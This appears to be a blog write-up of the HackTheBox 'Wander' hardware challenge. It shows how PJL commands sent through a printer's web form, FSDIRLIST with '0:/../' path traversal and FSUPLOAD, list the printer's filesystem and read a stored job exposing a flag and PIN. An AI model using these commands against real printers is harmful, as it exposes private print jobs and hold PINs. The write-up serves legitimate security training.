@@ -1,0 +1,103 @@
+<!DOCTYPE html>
+<html>
+    <head lang="en">
+        <meta charset="utf-8" />
+        <meta http-equiv="X-UA-Compatible" content="IE=edge">
+        <title>Wander - ~/xv1&#39;s projects</title>
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <link href="../../../css/fonts.css" rel="stylesheet">
+        <link rel="stylesheet" type="text/css" media="screen" href="../../../css/main.css" />
+    </head>
+    <body>
+        <div class="content">
+            <header>
+                <div class="main">
+                    <a href="../../../index.html">~/xv1&#39;s projects</a>
+                </div>
+                <nav>
+                    <a href="../../../writeups/index.html">./writeups</a>
+                    
+                </nav>
+            </header>
+            <main>
+                <article>
+                    <div class="title">
+                        <h1 class="title">Wander</h1>
+                        <div class="meta">Posted on Feb 8, 2024</div>
+                    </div>
+                    <div class="post-tags">
+                        <nav class="nav tags">
+                            <ul class="tags">
+                                <li><a href="/tags/htb">htb</a></li>
+                                <li><a href="/tags/hardware">hardware</a></li>
+                            </ul>
+                        </nav>
+                    </div>
+                    <section class="body">
+                        <blockquote>
+                            <p>My uncle isn&rsquo;t allowing me to print documents. He&rsquo;s off to vacation and I need a PIN to unlock this printer. All I found is a web server where this printer is managed from. Can you help me with this situation ?</p>
+                        </blockquote>
+                        <h4 id="steps">Steps</h4>
+                        <ol>
+                            <li>Start by navigating to the webpage by pasting the ip:port into browser</li>
+                            <li>The only tab that brough up a new page was <code>Job Controls</code>, which brough up the path <code>/jobs</code></li>
+                            <li>Submitting text brought up the path <code>/printer</code></li>
+                            <li>This is evident when inspecting the html code</li>
+                        </ol>
+                        <div class="highlight">
+                            <pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">form</span> <span style="color:#a6e22e">action</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;printer&#34;</span> <span style="color:#a6e22e">method</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;post&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>      &lt;<span style="color:#f92672">input</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text&#34;</span> <span style="color:#a6e22e">placeholder</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;@PJL INFO ID&#34;</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;pjl&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>      &lt;<span style="color:#f92672">input</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;submit&#34;</span> <span style="color:#a6e22e">value</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Send&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">form</span>&gt;
+</span></span></code></pre>
+                        </div>
+                        <ol start="5">
+                            <li>Submitting <code>@PJL INFO ID</code> returns <code>HTB Printer</code></li>
+                            <li>PJL stands for HP Printer Job Language, so I looked for more PJL commands from HP which brought me to this <a href="http://developers.hp.com/system/files/PJL_Technical_Reference_Manual.pdf">document</a></li>
+                            <li>I also found a reference for hacking printers <a href="http://hacking-printers.net/wiki/index.php/Credential_disclosure">here</a>, but that was not needed for this challenge</li>
+                            <li>The main command I used was <code>FSDIRLIST</code> to view and traverse the filesystem</li>
+                        </ol>
+                        <div class="highlight">
+                            <pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#75715e"># view current directory</span>
+</span></span><span style="display:flex;"><span>@PJL FSDIRLIST NAME<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;0:&#34;</span> ENTRY<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># view parent directory</span>
+</span></span><span style="display:flex;"><span>@PJL FSDIRLIST NAME<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;0:/../&#34;</span> ENTRY<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>
+</span></span></code></pre>
+                        </div>
+                        <ol start="9">
+                            <li>Once in the parent directory, I saw a home folder listed</li>
+                        </ol>
+                        <div class="highlight">
+                            <pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#75715e"># navigating to home folder</span>
+</span></span><span style="display:flex;"><span>@PJL FSDIRLIST NAME<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;0:/../home/&#34;</span> ENTRY<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>
+</span></span></code></pre>
+                        </div>
+                        <ol start="10">
+                            <li>The <code>home</code> folder contained a folder called <code>default</code>, which contained a file <code>readysize</code></li>
+                            <li>To see file contents, we use <code>FSUPLOAD</code></li>
+                        </ol>
+                        <div class="highlight">
+                            <pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#75715e"># command</span>
+</span></span><span style="display:flex;"><span>@PJL FSUPLOAD NAME<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;0:/../home/default/readyjob&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># contents</span>
+</span></span><span style="display:flex;"><span>@PJL FSUPLOAD FORMAT:BINARY NAME<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;0:/../home/default/readyjob&#34;</span> OFFSET<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span> SIZE<span style="color:#f92672">=</span><span style="color:#ae81ff">457</span>
+</span></span><span style="display:flex;"><span>%-12345X@PJL @PJL COMMENT FLAG <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;HTB{w4lk_4nd_XXXXXX}&#34;</span> @PJL JOB NAME <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;JetDirectBoot Job&#34;</span> @PJL SET
+</span></span><span style="display:flex;"><span>USERNAME<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;default&#34;</span> @PJL SET HOLDKEY<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;8214&#34;</span> @PJL SET ORIENTATION <span style="color:#f92672">=</span> PORTAIT @PJL SET QTY <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span> @PJL SET DUPLEX <span style="color:#f92672">=</span> ON @PJL SET RESOLUTION <span style="color:#f92672">=</span> <span style="color:#ae81ff">600</span> @PJL SET OUTBIN <span style="color:#f92672">=</span> LOWER
+</span></span><span style="display:flex;"><span>@PJL COMMENT START PCL JOB @PJL ENTER LANGUAGE <span style="color:#f92672">=</span> PCL %-12345X@PJL @PJL EOJ %-12345X
+</span></span></code></pre>
+                        </div>
+                    </section>
+                </article>
+            </main>
+            <footer>
+                <div class="footer-info">
+                    xv1 2024-4L 
+                    
+                </div>
+            </footer>
+        </div>
+    </body>
+</html>
+
